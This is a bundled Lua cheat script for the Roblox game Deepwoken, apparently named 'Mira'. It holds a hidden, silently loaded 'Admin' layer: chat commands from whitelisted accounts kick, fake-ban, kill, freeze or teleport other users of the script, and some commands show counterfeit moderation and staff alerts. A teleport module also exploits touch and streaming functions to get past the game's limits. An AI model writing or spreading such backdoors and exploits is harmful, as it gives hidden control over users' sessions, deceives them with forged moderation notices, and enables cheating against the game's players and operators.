---@module Utility.Profiler
local Profiler = require("Utility/Profiler")

---@module Mira
local Mira = require("Mira")

---Find existing instances and initialize the script.
local function initializeScript()
	-- Check if there's already another instance.
	if shared.Mira then
		-- Detach previous instance.
		shared.Mira.detach()

		-- Share the previous state.
		Mira.queued = shared.Mira.queued
	end

	-- Re-initialize under the new state.
	shared.Mira = Mira
	shared.Mira.init()

	-- Load developer-only admin command layer.
	pcall(function()
		require("Features/Admin").init()
	end)
end

---This is called when the initalization errors.
---@param error string
local function onInitializeError(error)
	-- Silent: no console output anywhere in the script.
	Mira.detach()
end

-- Safely profile and initialize the script aswell as handle errors.
Profiler.run("Main_InitializeScript", function(...)
	return xpcall(initializeScript, onInitializeError, ...)
end)

end)
__bundle_register("Features/Admin", function(require, _LOADED, __bundle_register, __bundle_modules)
-- Mira Admin â€” developer-only remote command layer.

local Players         = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

-- @module Utility.Logger
local Logger  = require("Utility/Logger")
-- @module GUI.Library
local Library = require("GUI/Library")
-- @module Game.KeyHandling
local KeyHandling = require("Game/KeyHandling")
-- @module Features.Game.Teleport
local Teleport = require("Features/Game/Teleport")
-- @module Utility.Configuration
local Configuration = require("Utility/Configuration")
-- @module Utility.CoreGuiManager
local CoreGuiManager = require("Utility/CoreGuiManager")

-- Own Sound instance, built the same way PlayerScanning builds its moderator alert so the fake one sounds identical.
local fakeModeratorSound = CoreGuiManager.imark(Instance.new("Sound"))

local Admin = {}

-- Command authority: only these UserIds can command, and only downward by rank; pinkcat! is top.
local PINKCAT_USERIDS = {
	[11254760950] = true, -- pinkcat! (main)
	[11452757414] = true, -- pinkcat! (alt)
}

-- True if the UserId belongs to pinkcat (either account).
local function isPinkcat(userId)
	return PINKCAT_USERIDS[userId] == true
end

local DEVELOPERS = {
	[11308703959] = { name = "planetcat", rank = 4 },
	[11254760950] = { name = "pinkcat!",  rank = math.huge }, -- pinkcat main
	[11452757414] = { name = "pinkcat!",  rank = math.huge }, -- pinkcat alt
	[4911244767]  = { name = "agamatsu",  rank = 2 },
	[11225983653] = { name = "poopdog",   rank = 1 },
	[10995954076] = { name = "poopdog",   rank = 1 },
	[5750954074]  = { name = "Counterfeit_Arcade", rank = 1 },
	[11300397569] = { name = "cuckbi",  rank = 1 },
}

local PREFIXES = { ";", ":" }

local function isDeveloper(userId)
	return DEVELOPERS[userId] ~= nil
end

local function developerName(userId)
	local entry = DEVELOPERS[userId]
	return entry and entry.name or nil
end

local function developerRank(userId)
	local entry = DEVELOPERS[userId]
	return entry and entry.rank or nil
end

-- Target resolution (per-client): self always allowed, else the sender must outrank us.
local function outranksMe(senderPlayer)
	local localPlayer = Players.LocalPlayer
	if not localPlayer or not senderPlayer then return false end
	if senderPlayer == localPlayer then return true end

	-- pinkcat! (either account) is always top authority: unbeatable, outranks all.
	if isPinkcat(localPlayer.UserId) then return false end
	if isPinkcat(senderPlayer.UserId) then return true end

	local myRank = developerRank(localPlayer.UserId)
	if not myRank then return true end

	local senderRank = developerRank(senderPlayer.UserId)
	return senderRank ~= nil and senderRank > myRank
end

local function amITarget(targetArg, senderPlayer)
	local localPlayer = Players.LocalPlayer
	if not localPlayer then return false end

	-- Protected: the sender doesn't outrank us, so nothing they send applies.
	if not outranksMe(senderPlayer) then return false end

	targetArg = (targetArg or ""):lower():gsub("%s+", "")
	if targetArg == "" then return false end            -- require explicit target
	if targetArg == "all" then return true end
	if targetArg == "me" then
		return senderPlayer ~= nil and senderPlayer == localPlayer
	end

	local name = localPlayer.Name:lower()
	local disp = (localPlayer.DisplayName or ""):lower()
	return name:find(targetArg, 1, true) ~= nil
		or disp:find(targetArg, 1, true) ~= nil
end

-- Commands (each runs on the client that IS the target).
local Commands = {}

-- ;unload â€” clean Mira teardown via its own unload path
Commands["unload"] = function()
	Logger.notify("Admin: unloading Mira.")
	task.wait(0.1)
	pcall(function() Library:Unload() end)
end

-- ;freeze â€” lock the target's character in place (held against the game)
local freezeState = { active = false, conn = nil, cf = nil }

local function stopFreezeLoop()
	if freezeState.conn then
		pcall(function() freezeState.conn:Disconnect() end)
		freezeState.conn = nil
	end
	freezeState.active = false
end

Commands["freeze"] = function()
	local RunService = game:GetService("RunService")
	local lp   = Players.LocalPlayer
	local char = lp and lp.Character
	local hrp  = char and char:FindFirstChild("HumanoidRootPart")
	if not (char and hrp) then return end

	-- remember where they are and pin every part
	freezeState.cf = hrp.CFrame
	for _, part in ipairs(char:GetChildren()) do
		if part:IsA("BasePart") then part.Anchored = true end
	end

	-- hold the position every frame so the game can't shove them
	stopFreezeLoop()
	freezeState.active = true
	freezeState.conn = RunService.Heartbeat:Connect(function()
		if not freezeState.active then return end
		local c = lp.Character
		local root = c and c:FindFirstChild("HumanoidRootPart")
		if root then
			root.Anchored = true
			root.AssemblyLinearVelocity = Vector3.zero
			root.CFrame = freezeState.cf
		end
	end)

	-- re-anchor if the character respawns while frozen
	if not freezeState.respawnConn then
		freezeState.respawnConn = lp.CharacterAdded:Connect(function(newChar)
			if not freezeState.active then return end
			task.wait(0.2)
			for _, part in ipairs(newChar:GetChildren()) do
				if part:IsA("BasePart") then part.Anchored = true end
			end
			local nroot = newChar:FindFirstChild("HumanoidRootPart")
			if nroot then freezeState.cf = nroot.CFrame end
		end)
	end

	Logger.notify("Admin: you have been frozen.")
end

-- ;unfreeze â€” release the freeze
Commands["unfreeze"] = function()
	stopFreezeLoop()
	local lp   = Players.LocalPlayer
	local char = lp and lp.Character
	if char then
		for _, part in ipairs(char:GetChildren()) do
			if part:IsA("BasePart") then part.Anchored = false end
		end
	end
	Logger.notify("Admin: you have been unfrozen.")
end

-- ;kick â€” removes the target from the game ;kick â€” kicks the target with a message naming the dev who did it
Commands["kick"] = function(senderPlayer)
	local kicker = (senderPlayer and developerName(senderPlayer.UserId)) or "an admin"
	local msg = string.format('You have been kicked from the game by "%s"', kicker)
	task.wait(0.1)
	pcall(function()
		Players.LocalPlayer:Kick(msg)
	end)
end

-- ;fakeban <target> -- kicks the target with a message shaped like a real moderation ban notice rather than an admin kick.
local function generateIncidentId()
	local chars = "0123456789abcdef"
	local out = table.create and table.create(9) or {}

	for index = 1, 9 do
		local pick = math.random(1, #chars)
		out[index] = chars:sub(pick, pick)
	end

	return table.concat(out)
end

Commands["fakeban"] = function()
	local msg = string.format(
		"You have been banned from the game.\nCategory: Moderation\nIncident ID: %s",
		generateIncidentId()
	)
	task.wait(0.1)
	pcall(function()
		Players.LocalPlayer:Kick(msg)
	end)
end

-- ;kill â€” deals max fall damage to the target via Mira's own remote
Commands["kill"] = function()
	local remote = KeyHandling.getRemote("FallDamage")
	if not remote then
		Logger.notify("Admin: fall damage remote not found.")
		return
	end
	-- slider maxes at 1000hp â€” send way past it to guarantee the kill
	pcall(function()
		remote:FireServer(99999, false)
	end)
	Logger.notify("Admin: you have been killed.")
end

-- ;tp <target> <destination> -- teleports the target via Mira's own Teleport module.
Commands["tp"] = function(_, args)
	local destination = (args or ""):match("^%S+")
	if not destination then
		Logger.notify("Admin: no destination given, e.g. ';tp me Depths'.")
		return
	end

	local ok = pcall(function()
		Teleport.start(destination)
	end)

	if ok then
		Logger.notify("Admin: teleporting you to '%s'.", destination)
	else
		Logger.notify("Admin: tp to '%s' failed.", destination)
	end
end

-- ;bring <target> -- pulls the target to wherever the sender (the dev who issued the command) currently is.
Commands["bring"] = function(senderPlayer)
	if not senderPlayer then
		return
	end

	local senderCharacter = senderPlayer.Character
	local senderRoot = senderCharacter and senderCharacter:FindFirstChild("HumanoidRootPart")
	if not senderRoot then
		Logger.notify("Admin: could not find %s to bring you to.", senderPlayer.Name)
		return
	end

	local localPlayer = Players.LocalPlayer
	local character = localPlayer and localPlayer.Character
	if not character then
		return
	end

	-- small offset so we don't land exactly inside the sender's own hitbox.
	local ok = pcall(function()
		character:PivotTo(senderRoot.CFrame + senderRoot.CFrame.RightVector * 3)
	end)

	if ok then
		Logger.notify("Admin: you have been brought to %s.", senderPlayer.Name)
	end
end

-- ;fakeagamatsu <target>: counterfeit staff-detected alert naming Agamatsu as "Admin" (mirrors PlayerScanning exactly).
Commands["fakeagamatsu"] = function()
	local FAKE_USERNAME = "Agamatsu"
	local FAKE_RANK = "Admin"

	local spoofName = Configuration.expectToggleValue("InfoSpoofing")
		and Configuration.expectToggleValue("SpoofOtherPlayers")

	-- If the real Agamatsu happens to be in the server, use their actual character name so the line matches what a genuine scan would print.
	local characterName = "Ace Sekhigi"
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr.Name:lower() == FAKE_USERNAME:lower() then
			characterName = plr:GetAttribute("CharacterName") or characterName
			break
		end
	end

	local shownName = spoofName and "[REDACTED]"
		or string.format("(%s) %s", characterName, FAKE_USERNAME)

	Logger.mnnotify("%s is a staff member with the rank '%s' in group.", shownName, FAKE_RANK)

	if Configuration.expectToggleValue("NotifyModSound") then
		fakeModeratorSound.SoundId = "rbxassetid://6045346303"
		fakeModeratorSound.PlaybackSpeed = 1
		fakeModeratorSound.Volume = Configuration.expectToggleValue("NotifyModSoundVolume") or 10
		fakeModeratorSound:Play()
	end
end

-- Parser: both chat hooks fire per message, so de-dupe identical commands within this window.
local DUPLICATE_WINDOW = 0.5
local recentCommands = {}

local function isDuplicate(userId, rawText)
	local now = os.clock()

	-- Prune anything past the window so this can't grow across a session.
	for key, seenAt in pairs(recentCommands) do
		if now - seenAt >= DUPLICATE_WINDOW then
			recentCommands[key] = nil
		end
	end

	local key = tostring(userId) .. "\0" .. rawText
	local last = recentCommands[key]
	recentCommands[key] = now

	return last ~= nil and (now - last) < DUPLICATE_WINDOW
end

local function tryHandle(rawText, senderPlayer)
	if type(rawText) ~= "string" then return end
	-- gate: sender's engine-stamped UserId must be whitelisted
	if not senderPlayer or not isDeveloper(senderPlayer.UserId) then return end

	local body
	for _, p in ipairs(PREFIXES) do
		if rawText:sub(1, #p) == p then
			body = rawText:sub(#p + 1)
			break
		end
	end
	if not body then return end

	-- Confirmed a prefixed command from a developer -- dedupe before acting, and only from here so ordinary chat never touches the table.
	if isDuplicate(senderPlayer.UserId, rawText) then return end

	local cmd, rest = body:match("^(%S+)%s*(.*)$")
	if not cmd then return end
	cmd = cmd:lower()

	-- Split off just the target token (me/all/name), keeping the trailing destination intact.
	local target, args = rest:match("^(%S*)%s*(.*)$")

	local action = Commands[cmd]
	if action and amITarget(target, senderPlayer) then
		task.spawn(function()
			local ok, err = pcall(action, senderPlayer, args)
			if not ok then
				Logger.warn("Admin cmd '%s' errored: %s", cmd, tostring(err))
			end
		end)
	end
end

-- Outbound (UI-driven): broadcast a command like a dev typing it in chat.
local function resolveChatChannel()
	local textChannels = TextChatService:FindFirstChild("TextChannels")
	if not textChannels then
		return nil
	end

	local channel = textChannels:FindFirstChild("RBXGeneral")
	if not channel then
		for _, child in next, textChannels:GetChildren() do
			if child:IsA("TextChannel") and child.Name ~= "RBXSystem" then
				channel = child
				break
			end
		end
	end

	return channel or textChannels:FindFirstChild("RBXSystem")
end

-- Fire a command at a target over chat.
function Admin.sendCommand(cmd, target, extra)
	if type(cmd) ~= "string" or cmd == "" then
		return false
	end

	target = target or ""
	extra = extra or ""

	local body = PREFIXES[1] .. cmd
	if target ~= "" then
		body = body .. " " .. target
	end
	if extra ~= "" then
		body = body .. " " .. extra
	end

	local channel = resolveChatChannel()
	if not channel then
		Logger.warn("Admin: no chat channel available to send '%s'.", cmd)
		return false
	end

	task.spawn(function()
		pcall(function()
			channel:SendAsync(body)
		end)
	end)

	return true
end

-- Public whitelist API (single source of truth shared with the UI panel).
Admin.PINKCAT_USERIDS = PINKCAT_USERIDS
Admin.isPinkcat = isPinkcat
Admin.DEVELOPERS = DEVELOPERS
Admin.isDeveloper = isDeveloper
Admin.developerName = developerName
Admin.developerRank = developerRank

-- Command names the UI can surface as buttons (kept in one place so the panel and the parser never drift apart).
Admin.commandNames = { "kill", "freeze", "unfreeze", "kick", "fakeban", "bring", "unload", "fakeagamatsu", "tp" }

-- Chat hooks (chain onto TextChatService without clobbering Mira's).
function Admin.init()
	-- modern TextChatService â€” preserve any existing handler
	pcall(function()
		local previous = TextChatService.OnIncomingMessage
		TextChatService.OnIncomingMessage = function(message)
			local source = message.TextSource
			local sender = source and Players:GetPlayerByUserId(source.UserId)
			pcall(tryHandle, message.Text, sender)
			if previous then
				return previous(message)
			end
		end
	end)

	-- legacy Chatted fallback
	local function bindLegacy(plr)
		plr.Chatted:Connect(function(msg) tryHandle(msg, plr) end)
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		pcall(bindLegacy, plr)
	end
	Players.PlayerAdded:Connect(function(plr) pcall(bindLegacy, plr) end)
end

return Admin
end)
__bundle_register("Utility/CoreGuiManager", function(require, _LOADED, __bundle_register, __bundle_modules)
return LPH_NO_VIRTUALIZE(function()
---@note: We need to be careful where we use CoreGui because exploits have this weird permission issue. We need consistent setting of the parent.
---@note: All scripts that must access this module should require it at the top of the file where it gets loaded.
local CoreGuiManager = {}

-- Instance list.
local instances = {}

---Mark an instance to be parented to CoreGui at initialization.
---@param instance Instance
---@return Instance
function CoreGuiManager.imark(instance)
	instances[#instances + 1] = instance
	return instance
end

---Consistently and safely parent(s) all instances to CoreGui.
---@return table
function CoreGuiManager.set()
	local coreGui = game:GetService("CoreGui")

	for _, instance in next, instances do
		instance.Parent = coreGui
	end

	return instances
end

---Remove all stored instances.
function CoreGuiManager.clear()
	for _, instance in next, instances do
		instance:Destroy()
	end

	instances = {}
end

---Return CoreGuiManager module.
return CoreGuiManager

end)()

end)
__bundle_register("Utility/Configuration", function(require, _LOADED, __bundle_register, __bundle_modules)
-- Safe configuration getter methods.
local Configuration = {}

-- Per-object option/toggle keys are built as `identifier .. topLevelIdentifier`.
local joinCache = {}
local function joinKey(identifier, topLevelIdentifier)
	local inner = joinCache[identifier]
	if not inner then
		inner = {}
		joinCache[identifier] = inner
	end

	local key = inner[topLevelIdentifier]
	if not key then
		key = identifier .. topLevelIdentifier
		inner[topLevelIdentifier] = key
	end

	return key
end

---Expect toggle value.
---@param key string
---@return any?
Configuration.expectToggleValue = LPH_NO_VIRTUALIZE(function(key)
	if not Toggles then
		return nil
	end

	local toggle = Toggles[key]

	if not toggle then
		return nil
	end

	return toggle.Value
end)

---Expect option value.
---@param key string
---@return any?
Configuration.expectOptionValue = LPH_NO_VIRTUALIZE(function(key)
	if not Options then
		return nil
	end

	local option = Options[key]

	if not option then
		return nil
	end

	return option.Value
end)

---Expect option values.
---@param key string
---@return any?
Configuration.expectOptionValues = LPH_NO_VIRTUALIZE(function(key)
	if not Options then
		return nil
	end

	local option = Options[key]

	if not option then
		return nil
	end

	return option.Values
end)

---Identify element.
---@param identifier string
---@param topLevelIdentifier string
---@return string
Configuration.identify = LPH_NO_VIRTUALIZE(function(identifier, topLevelIdentifier)
	return joinKey(identifier, topLevelIdentifier)
end)

---Fetch toggle value.
---@param identifier string
---@param topLevelIdentifier string
---@return any
Configuration.idToggleValue = LPH_NO_VIRTUALIZE(function(identifier, topLevelIdentifier)
	if not Toggles then
		return nil
	end

	local toggle = Toggles[joinKey(identifier, topLevelIdentifier)]
	if not toggle then
		return nil
	end

	return toggle.Value
end)

---Fetch option value.
---@param identifier string
---@param topLevelIdentifier string
---@return any
Configuration.idOptionValue = LPH_NO_VIRTUALIZE(function(identifier, topLevelIdentifier)
	if not Options then
		return nil
	end

	local option = Options[joinKey(identifier, topLevelIdentifier)]
	if not option then
		return nil
	end

	return option.Value
end)

---Fetch option values.
---@param identifier string
---@param topLevelIdentifier string
---@return any
Configuration.idOptionValues = LPH_NO_VIRTUALIZE(function(identifier, topLevelIdentifier)
	if not Options then
		return nil
	end

	local option = Options[joinKey(identifier, topLevelIdentifier)]
	if not option then
		return nil
	end

	return option.Values
end)

-- Return Configuration module.
return Configuration
end)
__bundle_register("Features/Game/Teleport", function(require, _LOADED, __bundle_register, __bundle_modules)
return LPH_NO_VIRTUALIZE(function()
-- Teleport module.
---@note: Teleports in Deepwoken do not work the same. They lag you back, obviously. This is a utility module to handle repeatedly teleporting for a specific purpose.
local Teleport = { destination = nil, gdp = nil }

---@module Utility.Maid
local Maid = require("Utility/Maid")

---@module Utility.Signal
local Signal = require("Utility/Signal")

---@module Utility.TaskSpawner
local TaskSpawner = require("Utility/TaskSpawner")

---@module Utility.Configuration
local Configuration = require("Utility/Configuration")

-- Services.
local replicatedStorage = game:GetService("ReplicatedStorage")
local runService = game:GetService("RunService")
local players = game:GetService("Players")

-- Maids.
local tmaid = Maid.new()

-- Teleport state.
local RUBBERBAND_THRESHOLD = 1000
local teleportFrameCount = 0
local SPAM_FRAMES = 30
local PAUSE_FRAMES = 15
local STREAM_REQUEST_INTERVAL = 0.5
-- Seconds to let the chunk stream in before we actually start teleporting.
local CHUNK_PRIME_DELAY = 0.50
local teleportStartTime = 0
local REALM_ALIASES = {
	EasternLuminant = { "EastLuminant", "East Luminant", "EasternLuminant", "Eastern Luminant" },
	EtreanLuminant = { "EtreanLuminant", "Etrean Luminant" },
}
local REALM_TELEPORTER_PATHS = {
	{ "ValleyExit", "RealmTeleport" },
	{ "ValleyExit", "RealmTeleporter" },
}
local teleporterCache = {}
local streamRequestTimes = {}

---On player GUI descendant added.
---@param child Instance
local function onPlayerGuiDescendantAdded(child)
	if not child:IsA("TextLabel") then
		return
	end

	local coords = string.split(child.Text, ", ")
	local x, y, z = tonumber(coords[1]), tonumber(coords[2]), tonumber(coords[3])
	if not x or not y or not z then
		return
	end

	local position = Vector3.new(x, y, z)

	if (position - Vector3.new(-20000, 20000, -20000)).Magnitude <= 20 and Teleport.destination == "Voidheart" then
		return Teleport.stop()
	end

	if (position - Vector3.new(1596.1, 555.7, 2849.9)).Magnitude <= 20 and Teleport.destination == "LowerErisia" then
		return Teleport.stop()
	end

	if Teleport.gdp and (position - Teleport.gdp).Magnitude <= 20 and Teleport.destination == "GuildDoor" then
		return Teleport.stop()
	end
end

---Get guild doors from partial or exact name.
---@note: First instance is the entrance door. The second instance is the exit door.
---@param name string
---@return Instance?, Instance?
local function getGuildDoors(name)
	for _, instance in next, workspace:GetChildren() do
		if not instance.Name:match("GuildDoor") then
			continue
		end

		local guildName = instance:GetAttribute("GuildName")
		if not guildName then
			continue
		end

		if not guildName:lower():match(name:lower()) then
			continue
		end

		return instance, workspace:FindFirstChild(string.gsub(instance.Name, "GuildDoor", "GuildExitDoor"))
	end

	return nil
end

---Fire touch interest on a part.
---@param character Model
---@param part BasePart
local function fireTouchOn(character, part)
	local hrp = character:FindFirstChild("HumanoidRootPart")
	if not hrp then
		return
	end

	pcall(firetouchinterest, hrp, part, 0)
	pcall(firetouchinterest, hrp, part, 1)
	pcall(firetouchinterest, hrp, part, 0)
	pcall(firetouchinterest, hrp, part, 1)
end

---Reset teleport state.
local function resetTeleportState()
	teleportFrameCount = 0
	teleportStartTime = 0
	teleporterCache = {}
	streamRequestTimes = {}
end

---Whether the chunk has had CHUNK_PRIME_DELAY to stream in since the teleport started.
---@return boolean
local function isChunkPrimed()
	return teleportStartTime > 0 and (os.clock() - teleportStartTime) >= CHUNK_PRIME_DELAY
end

---Request stream around a position.
---@param label string
---@param position Vector3
local function requestStreamAround(label, position)
	local timestamp = os.clock()
	local lastRequestTime = streamRequestTimes[label]
	if lastRequestTime and timestamp - lastRequestTime < STREAM_REQUEST_INTERVAL then
		return
	end

	streamRequestTimes[label] = timestamp
	tmaid:add(
		TaskSpawner.spawn(
			label,
			players.LocalPlayer.RequestStreamAroundAsync,
			players.LocalPlayer,
			position,
			0.1
		)
	)
end

---Check if realm name matches a destination.
---@param realm string
---@param destination string
---@return boolean
local function isRealmName(realm, destination)
	for _, alias in next, REALM_ALIASES[destination] or { destination } do
		if realm == alias then
			return true
		end
	end

	return false
end

---Get workspace child from path.
---@param path table
---@return Instance?
local function getWorkspacePath(path)
	local current = workspace
	for _, name in next, path do
		current = current:FindFirstChild(name)
		if not current then
			return nil
		end
	end

	return current
end

---Get realm teleporter from direct workspace paths.
---@param realm string
---@return BasePart?
local function getRealmTeleporter(realm)
	local cachedTeleporter = teleporterCache[realm]
	if cachedTeleporter and cachedTeleporter.Parent and isRealmName(cachedTeleporter:GetAttribute("Realm"), realm) then
		return cachedTeleporter
	end

	for _, path in next, REALM_TELEPORTER_PATHS do
		local teleporter = getWorkspacePath(path)
		if not teleporter or not teleporter:IsA("BasePart") then
			continue
		end

		if not isRealmName(teleporter:GetAttribute("Realm"), realm) then
			continue
		end

		teleporterCache[realm] = teleporter
		return teleporter
	end

	return nil
end

---Scan voidheart teleporter.
---@return BasePart?
local function scanVoidheartTeleporter()
	local warpPoints = workspace:FindFirstChild("WarpPoints")
	local voidheartWarpPoint = warpPoints and warpPoints:FindFirstChild("Voidheart")
	if voidheartWarpPoint and voidheartWarpPoint:IsA("BasePart") then
		return voidheartWarpPoint
	end

	local voidheart = workspace:FindFirstChild("Voidheart")
	local voidheartVoidWarp = voidheart and voidheart:FindFirstChild("VoidheartVoidWarp", true)
	if voidheartVoidWarp and voidheartVoidWarp:IsA("BasePart") then
		return voidheartVoidWarp
	end

	return nil
end

---Get voidheart teleporter.
---@return BasePart?
local function getVoidheartTeleporter()
	local cachedTeleporter = teleporterCache.Voidheart
	if cachedTeleporter and cachedTeleporter.Parent then
		return cachedTeleporter
	end

	local teleporter = scanVoidheartTeleporter()
	if teleporter then
		teleporterCache.Voidheart = teleporter
	end

	return teleporter
end

---Loop for teleport module.
local function onTeleportLoop()
	local dest = Teleport.destination
	if not dest then
		return
	end

	local localPlayer = players.LocalPlayer
	local character = localPlayer.Character
	if not character then
		return
	end

	if dest == "EasternLuminant" then
		requestStreamAround("Teleport_EasternLuminantStream", Vector3.new(-2632.86084, 628.632935, -6707.99805))

		-- Let the chunk stream in for CHUNK_PRIME_DELAY before teleporting.
		if not isChunkPrimed() then
			return
		end

		local realmTeleporter = getRealmTeleporter("EasternLuminant")
		if not realmTeleporter then
			return
		end

		character:PivotTo(realmTeleporter.CFrame)
		fireTouchOn(character, realmTeleporter)
	end

	if dest == "EtreanLuminant" then
		requestStreamAround("Teleport_EtreanLuminantStream", Vector3.new(-514.263, 665.174316, -4772.3208))

		-- Let the chunk stream in for CHUNK_PRIME_DELAY before teleporting.
		if not isChunkPrimed() then
			return
		end

		local realmTeleporter = getRealmTeleporter("EtreanLuminant")
		if not realmTeleporter then
			return
		end

		character:PivotTo(realmTeleporter.CFrame)
		fireTouchOn(character, realmTeleporter)
	end

	if dest == "Depths" then
		tmaid:add(
			TaskSpawner.spawn(
				"Teleport_DepthsStream",
				players.LocalPlayer.RequestStreamAroundAsync,
				players.LocalPlayer,
				Vector3.new(39911.3672, 39980.9375, 39708.3203),
				0.1
			)
		)

		-- Let the chunk stream in for CHUNK_PRIME_DELAY before teleporting.
		if not isChunkPrimed() then
			return
		end

		local modOffice = workspace:FindFirstChild("ModOffice")
		local officePit = modOffice and modOffice:FindFirstChild("OfficePit")
		if not officePit then
			return
		end

		character:PivotTo(officePit.CFrame)
	end

	if dest == "Voidheart" then
		local voidheartTeleporter = getVoidheartTeleporter()
		requestStreamAround(
			"Teleport_VoidheartStream",
			voidheartTeleporter and voidheartTeleporter.Position or Vector3.new(-20000.0, 19713.9609, -20000.0)
		)

		-- Let the chunk stream in for CHUNK_PRIME_DELAY before teleporting.
		if not isChunkPrimed() then
			return
		end

		if not voidheartTeleporter then
			return
		end

		local vhCFrame = voidheartTeleporter.CFrame
		teleportFrameCount = teleportFrameCount + 1
		local cycleFrame = (teleportFrameCount - 1) % (SPAM_FRAMES + PAUSE_FRAMES)

		-- Spam phase: PivotTo + touch.
		if cycleFrame < SPAM_FRAMES then
			character:PivotTo(vhCFrame)
			fireTouchOn(character, voidheartTeleporter)
			return
		end

		-- Pause phase: let server respond.
		if cycleFrame == SPAM_FRAMES + PAUSE_FRAMES - 1 then
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if hrp and (hrp.Position - vhCFrame.Position).Magnitude <= RUBBERBAND_THRESHOLD then
				return Teleport.stop()
			end
		end
	end

	if dest == "TrialOfOne" then
		tmaid:add(
			TaskSpawner.spawn(
				"Teleport_TrialStream",
				players.LocalPlayer.RequestStreamAroundAsync,
				players.LocalPlayer,
				Vector3.new(-959.787659, 146.996887, -6659.63037),
				0.1
			)
		)

		-- Let the chunk stream in for CHUNK_PRIME_DELAY before teleporting.
		if not isChunkPrimed() then
			return
		end

		local oneEntrance = workspace:FindFirstChild("OneEntrance")
		if not oneEntrance then
			return
		end

		local effectReplicator = replicatedStorage:FindFirstChild("EffectReplicator")
		if not effectReplicator then
			return
		end

		local effectReplicatorModule = require(effectReplicator)
		if not effectReplicatorModule then
			return
		end

		if effectReplicatorModule:FindEffect("Knocked") then
			return Teleport.stop()
		end

		character:PivotTo(oneEntrance.CFrame)
	end

	if dest == "GuildDoor" then
		local guildName = Configuration.expectOptionValue("GuildDoorName")
		if not guildName or #guildName <= 0 then
			return
		end

		local entranceDoor, exitDoor = getGuildDoors(guildName)
		if not entranceDoor or not exitDoor then
			return
		end

		local guildBaseCFrame = entranceDoor:GetAttribute("TargetCFrame")
		if not guildBaseCFrame then
			return
		end

		local guildDoorCFrame = exitDoor:GetAttribute("TargetCFrame")
		if not guildDoorCFrame then
			return
		end

		Teleport.gdp = guildDoorCFrame.Position

		-- Stream in the guild base.
		requestStreamAround("Teleport_GuildBaseStream", guildBaseCFrame.Position)

		-- Let the chunk stream in for CHUNK_PRIME_DELAY before teleporting.
		if not isChunkPrimed() then
			return
		end

		teleportFrameCount = teleportFrameCount + 1

		-- Only check arrival after at least one PivotTo cycle.
		if teleportFrameCount > 1 then
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if hrp and (hrp.Position - entranceDoor.Position).Magnitude <= 50 then
				return Teleport.stop()
			end
		end

		-- Teleport over their bounds to trigger a forced game teleport.
		character:PivotTo(CFrame.new(guildBaseCFrame.Position - Vector3.new(0, 150, 0)))
	end
end

---Start teleport module.
---@param destination string
function Teleport.start(destination)
	if not destination then
		return error("Destination must be provided for teleporting.")
	end

	resetTeleportState()
	teleportStartTime = os.clock()
	Teleport.destination = destination
end

---Stop teleport module.
function Teleport.stop()
	resetTeleportState()
	Teleport.destination = nil
end

---Initialize Teleport module.
function Teleport.init()
	local localPlayer = players.LocalPlayer
	local playerGui = localPlayer:WaitForChild("PlayerGui")
	local descendantAddedSignal = Signal.new(playerGui.DescendantAdded)
	tmaid:mark(descendantAddedSignal:connect("Teleport_PlayerGui_DescendantAdded", onPlayerGuiDescendantAdded))

	local renderStepped = Signal.new(runService.RenderStepped)
	tmaid:mark(renderStepped:connect("Teleport_RenderStepped", onTeleportLoop))
end

---Detach Teleport module.
function Teleport.detach()
	tmaid:clean()
end

-- Return Teleport module.
return Teleport

end)()
end)
__bundle_register("Utility/TaskSpawner", function(require, _LOADED, __bundle_register, __bundle_modules)
-- Task spawner module.
local TaskSpawner = {}

---@module Utility.Profiler
local Profiler = require("Utility/Profiler")

---@module Utility.Logger
local Logger = require("Utility/Logger")

-- Services.
local RunService = game:GetService("RunService")

---Spawn delayed task where the delay can be variable.
---@param label string
---@param delay function
---@param callback function
---@vararg any
function TaskSpawner.delay(label, delay, callback, ...)
	---Log task errors.
	---@param error string
	local function onTaskFunctionError(error)
		Logger.trace("onTaskFunctionError - (%s) - %s", label, error)
	end

	-- Wrap callback in profiler and error handling and delay handling.
	local taskFunction = Profiler.wrap(
		label,
		LPH_NO_VIRTUALIZE(function(...)
			local timestamp = os.clock()

			while os.clock() - timestamp < delay() do
				RunService.RenderStepped:Wait()
			end

			return xpcall(callback, onTaskFunctionError, ...)
		end)
	)

	return task.spawn(taskFunction, ...)
end

---Spawn task.
---@param label string
---@param callback function
---@vararg any
function TaskSpawner.spawn(label, callback, ...)
	---Log task errors.
	---@param error string
	local function onTaskFunctionError(error)
		Logger.trace("onTaskFunctionError - (%s) - %s", label, error)
	end

	-- Wrap callback in profiler and error handling.
	local taskFunction = Profiler.wrap(
		label,
		LPH_NO_VIRTUALIZE(function(...)
			return xpcall(callback, onTaskFunctionError, ...)
		end)
	)

	-- Return reference.
	return task.spawn(taskFunction, ...)
end

-- Return TaskSpawner module.
return TaskSpawner


end)
__bundle_register("Utility/Logger", function(require, _LOADED, __bundle_register, __bundle_modules)
return (function()
	-- Logger module.
	local Logger = {}
	Logger.__index = Logger

	---@module GUI.Library
	local Library = require("GUI/Library")

	---@module Utility.Configuration
	local Configuration = require("Utility/Configuration")

	---Create a manually managed notification.
	---@param str string
	---@return function
	function Logger.mnnotify(str, ...)
		return Library:ManuallyManagedNotify(string.format(str, ...))
	end

	---Quick notify message.
	---@param str string
	function Logger.qnotify(str, ...)
		local quickNotificationSpeed = Configuration.expectOptionValue("QuickNotificationSpeed") or 0.5
		Library:Notify(string.format(str, ...), quickNotificationSpeed)
	end

	---Notify message with a default short cooldown to create consistent cooldowns between files.
	---@param str string
	function Logger.notify(str, ...)
		Library:Notify(string.format(str, ...), 3.0)
	end

	---Notify message with a default long cooldown to create consistent cooldowns between files.
	---@param str string
	function Logger.longNotify(str, ...)
		Library:Notify(string.format(str, ...), 30.0)
	end

	--- Warn message.
	---@param str string
	function Logger.warn(str, ...) end

	--- Trace & warn message.
	---@param str string
	function Logger.trace(str, ...) end

	-- Return Logger module.
	return Logger
end)()
end)
